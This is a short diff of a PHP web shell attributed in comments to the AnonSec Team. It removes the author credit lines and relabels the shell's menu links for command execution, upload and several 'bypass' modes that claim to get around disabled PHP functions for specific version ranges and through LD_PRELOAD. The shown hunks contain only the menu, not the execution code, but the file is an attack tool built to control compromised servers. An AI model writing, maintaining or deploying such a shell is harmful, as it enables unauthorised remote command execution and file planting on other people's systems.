@@ -1,6 +1,3 @@
-<!-- Thanks to all member of AnonSec Team -->
-<!-- Recode ? Silahkan, tapi jangan lupa cantumkan nama author nya xixixi -->
-<!-- Anon7 - AnonsecTeam -->
 <!DOCTYPE html>
 <html>
 <head>
@@ -460,10 +457,10 @@ if (isset($_POST['upwkwk'])) {
 echo "</table><br>";
 echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">';
 echo '<th>[ &nbsp;<a href="'.$_SERVER['SCRIPT_NAME'].'">Home</a>&nbsp; ]</th>';
-echo '<th>[ &nbsp;<a href="?path='.$lokasi.'&komend=gaskan">C0mmand</a>&nbsp; ]</th>';
-echo '<th>[ &nbsp;<a href="?path='.urlencode($lokasi).'&komendv2=gaskan">C0mmand V2 (Pwn)</a>&nbsp; ]</th>';
-echo '<th>[ &nbsp;<a href="?path='.urlencode($lokasi).'&komendv3=gaskan">C0mmand V3 (LD_PRELOAD)</a>&nbsp; ]</th>';
-echo '<th>[ &nbsp;<a href="?path='.urlencode($lokasi).'&komendv4=gaskan">CmdV4 (Pwn4)</a>&nbsp; ]</th>';
+echo '<th>[ &nbsp;<a href="?path='.$lokasi.'&komend=gaskan">C0ommand</a>&nbsp; ]</th>';
+echo '<th>[ &nbsp;<a href="?path='.urlencode($lokasi).'&komendv2=gaskan">C0ommand bypV1 8.2-8.5</a>&nbsp; ]</th>';
+echo '<th>[ &nbsp;<a href="?path='.urlencode($lokasi).'&komendv3=gaskan">C0ommand bypV2 w LDP</a>&nbsp; ]</th>';
+echo '<th>[ &nbsp;<a href="?path='.urlencode($lokasi).'&komendv4=gaskan">C0ommand bypV3 7.3-8.1</a>&nbsp; ]</th>';
 echo '<th>[ &nbsp;<a href="?path='.$lokasi.'&upload=gaskan">Upload File</a>&nbsp; ]</th>';
 echo "</table><br>";
 
